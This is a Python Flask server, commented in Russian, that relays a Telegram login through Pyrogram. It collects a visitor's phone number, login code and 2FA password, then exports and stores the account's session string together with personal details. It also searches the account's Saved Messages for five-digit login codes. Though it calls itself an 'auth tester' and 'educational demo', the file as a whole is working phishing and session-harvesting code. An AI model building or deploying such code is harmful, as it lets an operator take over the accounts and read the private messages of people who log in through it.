import os
import asyncio
import logging
import time
import threading
import json
import re
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_from_directory
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PhoneNumberInvalid, 
    PhoneCodeExpired,
    FloodWait
)

# Настройка логирования для Railway
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__, 
            template_folder='templates',
            static_folder='templates',
            static_url_path='/static')

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory('templates', filename)

# 🔧 УЛУЧШЕННЫЙ КЛАСС ДЛЯ RAILWAY
class TelegramCodeFinder:
    def __init__(self, session_string):
        # Используем уникальное имя для избежания конфликтов
        session_name = f"railway_finder_{int(time.time())}"
        self.client = Client(
            session_name, 
            session_string=session_string,
            in_memory=True
        )
    
    async def find_telegram_code(self):
        """Поиск кода подтверждения от Telegram с улучшенной обработкой ошибок"""
        try:
            async with self.client:
                logger.info("🔍 Запуск поиска кода на Railway...")
                
                codes_found = []
                
                # 🔧 УПРОЩЕННЫЙ ПОИСК ТОЛЬКО В SAVED MESSAGES
                try:
                    async for message in self.client.get_chat_history('me', limit=30):
                        if message.text:
                            # Простой поиск любых 5 цифр
                            codes = re.findall(r'\b\d{5}\b', message.text)
                            if codes:
                                code = codes[0]
                                codes_found.append({
                                    'code': code,
                                    'text': message.text[:100],
                                    'date': message.date.isoformat() if message.date else None,
                                    'from': 'Telegram'
                                })
                                logger.info(f"✅ Найден код: {code}")
                                break  # Нашли код - выходим
                except Exception as e:
                    logger.warning(f"⚠️ Ошибка при поиске в saved messages: {e}")
                
                return codes_found
                
        except Exception as e:
            logger.error(f"❌ Критическая ошибка поиска: {e}")
            return None

# 🔧 УПРОЩЕННАЯ ФУНКЦИЯ ПОИСКА
async def find_telegram_code_simple(session_string):
    """Упрощенный поиск кода для Railway"""
    try:
        finder = TelegramCodeFinder(session_string)
        codes = await finder.find_telegram_code()
        
        if codes:
            return {
                'success': True,
                'code_found': True,
                'telegram_code': codes[0]['code'],
                'message': f"✅ Код найден: {codes[0]['code']}",
                'debug': f"Проверено сообщений: 30"
            }
        else:
            return {
                'success': True,
                'code_found': False,
                'telegram_code': None,
                'message': "❌ Код не найден в последних 30 сообщениях",
                'debug': "Ищите вручную в чате 'Telegram'"
            }
    except Exception as e:
        logger.error(f"❌ Ошибка упрощенного поиска: {e}")
        return {
            'success': False,
            'error': f'Ошибка поиска: {str(e)}'
        }

class JSONStorageManager:
    def __init__(self):
        self.storage_path = "./tdata_storage"
        self.init_storage()
    
    def init_storage(self):
        try:
            os.makedirs(f"{self.storage_path}/users", exist_ok=True)
            os.makedirs(f"{self.storage_path}/sessions", exist_ok=True)
            os.makedirs(f"{self.storage_path}/tdata", exist_ok=True)
            logger.info("✅ JSON хранилище инициализировано")
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации хранилища: {e}")
    
    def save_user(self, user_data):
        try:
            user_file = f"{self.storage_path}/users/{user_data['id']}.json"
            with open(user_file, 'w', encoding='utf-8') as f:
                json.dump(user_data, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения пользователя: {e}")
            return False
    
    def save_session(self, user_id, session_data, request_info=None):
        try:
            session_id = int(time.time() * 1000)
            session_file = f"{self.storage_path}/sessions/{session_id}.json"
            
            session_record = {
                'id': session_id,
                'user_id': user_id,
                'session_data': session_data,
                'request_info': request_info,
                'created_at': datetime.now().isoformat(),
                'is_active': True
            }
            
            with open(session_file, 'w', encoding='utf-8') as f:
                json.dump(session_record, f, indent=2, ensure_ascii=False)
            
            return session_id
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения сессии: {e}")
            return None
    
    def save_tdata(self, user_id, session_id, tdata_json):
        try:
            tdata_id = int(time.time() * 1000)
            tdata_file = f"{self.storage_path}/tdata/{tdata_id}.json"
            
            tdata_record = {
                'id': tdata_id,
                'user_id': user_id,
                'session_id': session_id,
                'tdata_json': tdata_json,
                'exported_at': datetime.now().isoformat()
            }
            
            with open(tdata_file, 'w', encoding='utf-8') as f:
                json.dump(tdata_record, f, indent=2, ensure_ascii=False)
            
            return tdata_id
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения TData: {e}")
            return None
    
    def get_user_sessions(self, user_id):
        try:
            sessions = []
            sessions_dir = f"{self.storage_path}/sessions"
            
            if not os.path.exists(sessions_dir):
                return []
            
            for filename in os.listdir(sessions_dir):
                if filename.endswith('.json'):
                    filepath = os.path.join(sessions_dir, filename)
                    with open(filepath, 'r', encoding='utf-8') as f:
                        session_data = json.load(f)
                        if session_data.get('user_id') == user_id:
                            sessions.append({
                                'id': session_data['id'],
                                'session_string': session_data['session_data'].get('session_string'),
                                'dc_id': session_data['session_data'].get('dc_id'),
                                'created_at': session_data['created_at'],
                                'is_active': session_data.get('is_active', True)
                            })
            
            return sorted(sessions, key=lambda x: x['created_at'], reverse=True)
        except Exception as e:
            logger.error(f"❌ Ошибка получения сессий: {e}")
            return []
    
    def get_stats(self):
        try:
            users_dir = f"{self.storage_path}/users"
            sessions_dir = f"{self.storage_path}/sessions"
            tdata_dir = f"{self.storage_path}/tdata"
            
            users_count = len([f for f in os.listdir(users_dir) if f.endswith('.json')]) if os.path.exists(users_dir) else 0
            sessions_count = len([f for f in os.listdir(sessions_dir) if f.endswith('.json')]) if os.path.exists(sessions_dir) else 0
            tdata_count = len([f for f in os.listdir(tdata_dir) if f.endswith('.json')]) if os.path.exists(tdata_dir) else 0
            
            return {
                'total_users': users_count,
                'active_sessions': sessions_count,
                'total_tdata_records': tdata_count
            }
        except Exception as e:
            logger.error(f"❌ Ошибка получения статистики: {e}")
            return {'total_users': 0, 'active_sessions': 0, 'total_tdata_records': 0}

storage = JSONStorageManager()

class AsyncRunner:
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()
    
    def _run_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()
    
    def run_coroutine(self, coro):
        # 🔧 УВЕЛИЧИВАЕМ ТАЙМАУТ ДЛЯ RAILWAY
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        return future.result(timeout=60)

async_runner = AsyncRunner()

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

def load_api_keys():
    try:
        from dotenv import load_dotenv
        load_dotenv()
        logger.info("✅ .env файл загружен")
    except ImportError:
        logger.warning("⚠️ python-dotenv не установлен")
    
    api_id = os.getenv('TELEGRAM_API_ID')
    api_hash = os.getenv('TELEGRAM_API_HASH')
    secret_key = os.getenv('SECRET_KEY', 'educational-demo-secret-key-2024')
    
    return api_id, api_hash, secret_key

API_ID, API_HASH, SECRET_KEY = load_api_keys()
app.secret_key = SECRET_KEY

# 🔧 ИСПРАВЛЯЕМ ХРАНЕНИЕ СЕССИЙ - ДЕЛАЕМ ЕГО УСТОЙЧИВЫМ
ACTIVE_SESSIONS = {}
SESSION_TIMEOUT = 300  # 5 минут

def cleanup_expired_sessions():
    """Очистка просроченных сессий"""
    current_time = time.time()
    expired_sessions = []
    
    for session_id, session_data in ACTIVE_SESSIONS.items():
        if current_time - session_data['created_at'] > SESSION_TIMEOUT:
            expired_sessions.append(session_id)
    
    for session_id in expired_sessions:
        if session_id in ACTIVE_SESSIONS:
            try:
                client = ACTIVE_SESSIONS[session_id].get('client')
                if client:
                    asyncio.create_task(client.disconnect())
            except:
                pass
            del ACTIVE_SESSIONS[session_id]
            logger.info(f"🗑️ Удалена просроченная сессия: {session_id}")

class TelegramAuthTester:
    def __init__(self):
        self.api_id = None
        self.api_hash = None
        self.initialized = False
        self.initialize_client()
        
    def initialize_client(self):
        try:
            if not API_ID or not API_HASH:
                logger.error("❌ API ключи не установлены")
                self.initialized = False
                return
                
            self.api_id = int(API_ID)
            self.api_hash = API_HASH
            self.initialized = True
            logger.info(f"✅ Pyrogram тестер инициализирован с API_ID: {self.api_id}")
            
        except ValueError as e:
            logger.error(f"❌ Неверный формат API_ID: {e}")
            self.initialized = False
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            self.initialized = False
    
    async def request_code(self, phone_number):
        if not self.initialized:
            return {'success': False, 'error': 'Клиент не инициализирован'}
            
        client = None
        try:
            session_id = f"{phone_number}_{int(time.time())}"
            
            client = Client(
                name=session_id,
                api_id=self.api_id,
                api_hash=self.api_hash,
                in_memory=True
            )
            
            await client.connect()
            
            logger.info(f"📱 Запрос кода для: {phone_number}")
            sent_code = await client.send_code(phone_number)
            
            # 🔧 СОХРАНЯЕМ СЕССИЮ С ОБНОВЛЕННЫМИ ДАННЫМИ
            ACTIVE_SESSIONS[session_id] = {
                'client': client,
                'phone': phone_number,
                'phone_code_hash': sent_code.phone_code_hash,
                'created_at': time.time(),
                'needs_password': False
            }
            
            logger.info(f"📱 Код отправлен. Session: {session_id}")
            logger.info(f"📊 Активных сессий: {len(ACTIVE_SESSIONS)}")
            
            return {
                'success': True,
                'message': 'Код отправлен в Telegram!',
                'session_id': session_id
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка запроса кода: {e}")
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
    
    async def verify_code(self, session_id, code):
        # 🔧 ДОБАВЛЯЕМ ОЧИСТКУ ПРОСРОЧЕННЫХ СЕССИЙ ПЕРЕД ПРОВЕРКОЙ
        cleanup_expired_sessions()
        
        if session_id not in ACTIVE_SESSIONS:
            logger.error(f"❌ Сессия не найдена: {session_id}")
            logger.info(f"📊 Доступные сессии: {list(ACTIVE_SESSIONS.keys())}")
            return {'success': False, 'error': 'Сессия не найдена или истекла'}
            
        session_data = ACTIVE_SESSIONS[session_id]
        client = session_data['client']
        phone = session_data['phone']
        phone_code_hash = session_data['phone_code_hash']
        
        try:
            logger.info(f"🔐 Верификация кода {code} для {phone}")
            
            await client.sign_in(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
                phone_code=code
            )
            
            logger.info("✅ Успешная аутентификация")
            
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'phone_number': me.phone_number,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username
            }
            
            export_result = await self.export_tdata(client, user_info)
            
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            
            if export_result['success']:
                return {
                    'success': True,
                    'message': 'Аутентификация и экспорт TData успешны!',
                    'user_info': user_info,
                    'export_info': export_result
                }
            else:
                return export_result
                
        except SessionPasswordNeeded:
            logger.info("🔒 Требуется 2FA пароль")
            # 🔧 ОБНОВЛЯЕМ СЕССИЮ С ФЛАГОМ 2FA
            session_data['needs_password'] = True
            ACTIVE_SESSIONS[session_id] = session_data
            
            logger.info(f"🔐 Сессия {session_id} переведена в режим 2FA")
            
            return {
                'success': True,
                'message': 'Требуется пароль 2FA',
                'needs_password': True,
                'session_id': session_id
            }
            
        except PhoneCodeInvalid as e:
            logger.warning(f"⚠️ Неверный код: {e}")
            return {'success': False, 'error': 'Неверный код подтверждения'}
            
        except PhoneCodeExpired as e:
            logger.warning(f"⏰ Код истек: {e}")
            await client.disconnect()
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': 'Код истек. Запросите новый.'}
            
        except FloodWait as e:
            logger.warning(f"⏳ Flood wait: {e.value} секунд")
            await client.disconnect()
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {
                'success': False, 
                'error': f'Слишком много попыток. Попробуйте через {e.value} секунд.'
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка верификации: {e}")
            try:
                await client.disconnect()
            except:
                pass
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
    
    async def verify_password(self, session_id, password):
        # 🔧 ДОБАВЛЯЕМ ОЧИСТКУ ПРОСРОЧЕННЫХ СЕССИЙ
        cleanup_expired_sessions()
        
        if session_id not in ACTIVE_SESSIONS:
            logger.error(f"❌ Сессия не найдена для 2FA: {session_id}")
            logger.info(f"📊 Доступные сессии: {list(ACTIVE_SESSIONS.keys())}")
            return {'success': False, 'error': 'Сессия не найдена'}
            
        session_data = ACTIVE_SESSIONS[session_id]
        
        # 🔧 ПРОВЕРЯЕМ ЧТО СЕССИЯ В РЕЖИМЕ 2FA
        if not session_data.get('needs_password'):
            logger.error(f"❌ Неверный статус сессии для 2FA: {session_id}")
            return {'success': False, 'error': 'Неверный статус сессии'}
            
        client = session_data['client']
        
        try:
            logger.info("🔑 Верификация пароля 2FA")
            
            await client.check_password(password=password)
            
            logger.info("✅ Успешная аутентификация с паролем 2FA")
            
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'phone_number': me.phone_number,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username
            }
            
            export_result = await self.export_tdata(client, user_info)
            
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            
            if export_result['success']:
                return {
                    'success': True,
                    'message': 'Аутентификация и экспорт TData успешны!',
                    'user_info': user_info,
                    'export_info': export_result
                }
            else:
                return export_result
                
        except Exception as e:
            logger.error(f"❌ Ошибка верификации пароля: {e}")
            try:
                await client.disconnect()
            except:
                pass
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': 'Неверный пароль 2FA'}
    
    async def export_tdata(self, client, user_info, request_info=None):
        try:
            session_string = await client.export_session_string()
        
            dc_info = await client.storage.dc_id()
            dc_id = dc_info if dc_info else 2
        
            tdata_info = {
                'version': '1.0',
                'user_id': user_info['id'],
                'phone_number': user_info.get('phone_number', ''),
                'first_name': user_info.get('first_name', ''),
                'last_name': user_info.get('last_name', ''),
                'username': user_info.get('username', ''),
                'session_string': session_string,
                'dc_id': dc_id,
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Pyrogram Export',
                'system_version': '1.0',
                'app_version': '1.0',
                'lang_code': 'en',
                'system_lang_code': 'en',
                'exported_at': datetime.now().isoformat(),
                'session_type': 'pyrogram_string_session'
            }
        
            storage.save_user(user_info)
        
            session_data = {
                'session_string': session_string,
                'dc_id': dc_id,
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Pyrogram Export',
                'system_version': '1.0',
                'app_version': '1.0',
                'lang_code': 'en',
                'system_lang_code': 'en'
            }
        
            session_id = storage.save_session(user_info['id'], session_data, request_info)
        
            if session_id:
                tdata_id = storage.save_tdata(user_info['id'], session_id, tdata_info)
            
                logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
                
                # 🔧 ЗАПУСКАЕМ УПРОЩЕННЫЙ ПОИСК ДЛЯ RAILWAY
                logger.info("🔍 Запуск упрощенного поиска кода на Railway...")
                try:
                    code_search_result = await find_telegram_code_simple(session_string)
                    if code_search_result['success'] and code_search_result['code_found']:
                        logger.info(f"✅ Найден код: {code_search_result['telegram_code']}")
                    else:
                        logger.info("❌ Код не найден")
                except Exception as e:
                    logger.warning(f"⚠️ Поиск кода завершился с ошибкой: {e}")
                    code_search_result = {'success': False, 'error': str(e)}
            
                return {
                    'success': True,
                    'session_id': session_id,
                    'tdata_id': tdata_id,
                    'user_id': user_info['id'],
                    'session_string': session_string,
                    'message': 'Аутентификация успешна!',
                    'code_search_result': code_search_result
                }
            else:
                return {'success': False, 'error': 'Ошибка сохранения сессии'}
            
        except Exception as e:
            logger.error(f"❌ Ошибка экспорта TData: {e}")
            return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}

auth_tester = TelegramAuthTester()

# 🔧 ДОБАВИМ HEALTH CHECK ДЛЯ RAILWAY
@app.route('/health')
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'environment': os.getenv('RAILWAY_ENVIRONMENT', 'development'),
        'active_sessions': len(ACTIVE_SESSIONS)
    })

# 🔧 ОБНОВЛЯЕМ API ENDPOINT ДЛЯ RAILWAY
@app.route('/api/find-telegram-code', methods=['POST', 'OPTIONS'])
def find_telegram_code():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_string = data.get('session_string', '').strip()
        
        if not session_string:
            return jsonify({'success': False, 'error': 'Session string required'}), 400
        
        # 🔧 ИСПОЛЬЗУЕМ УПРОЩЕННУЮ ВЕРСИЮ ДЛЯ RAILWAY
        result = async_runner.run_coroutine(find_telegram_code_simple(session_string))
        return jsonify(result)
        
    except asyncio.TimeoutError:
        logger.error("⏰ Таймаут поиска кода на Railway")
        return jsonify({
            'success': False, 
            'error': 'Таймаут поиска. Попробуйте позже.'
        }), 408
    except Exception as e:
        logger.error(f"❌ Ошибка поиска кода на Railway: {e}")
        return jsonify({
            'success': False, 
            'error': f'Server error: {str(e)}'
        }), 500

@app.route('/')
def home():
    stats = storage.get_stats()
    return render_template('index.html', stats=stats)

@app.route('/api/auth/request-code', methods=['POST', 'OPTIONS'])
def request_code():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'Введите номер телефона'}), 400
        
        result = async_runner.run_coroutine(auth_tester.request_code(phone))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка запроса кода: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/auth/verify-code', methods=['POST', 'OPTIONS'])
def verify_code():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_id = data.get('session_id', '').strip()
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'}), 400
            
        code = data.get('code', '').strip()
        
        if not code:
            return jsonify({'success': False, 'error': 'Введите код'}), 400
        
        result = async_runner.run_coroutine(auth_tester.verify_code(session_id, code))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка верификации кода: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/auth/verify-password', methods=['POST', 'OPTIONS'])
def verify_password():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_id = data.get('session_id', '').strip()
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'}), 400
            
        password = data.get('password', '')
        
        if not password:
            return jsonify({'success': False, 'error': 'Введите пароль'}), 400
        
        result = async_runner.run_coroutine(auth_tester.verify_password(session_id, password))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка верификации пароля: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/storage/stats', methods=['GET'])
def storage_stats():
    try:
        stats = storage.get_stats()
        return jsonify({
            'success': True,
            'storage_type': 'JSON',
            'statistics': stats
        })
    except Exception as e:
        logger.error(f"❌ Ошибка получения статистики: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    port = int(os.getenv('PORT', 8080))
    host = '0.0.0.0'
    
    logger.info(f"🚀 Запуск приложения на {host}:{port}")
    logger.info(f"🌍 Railway Environment: {os.getenv('RAILWAY_ENVIRONMENT', 'Not set')}")
    
    os.makedirs('templates', exist_ok=True)
    
    # 🔧 НАСТРОЙКИ ДЛЯ PRODUCTION
    debug = os.getenv('DEBUG', 'false').lower() == 'true'
    
    app.run(host=host, port=port, debug=debug)
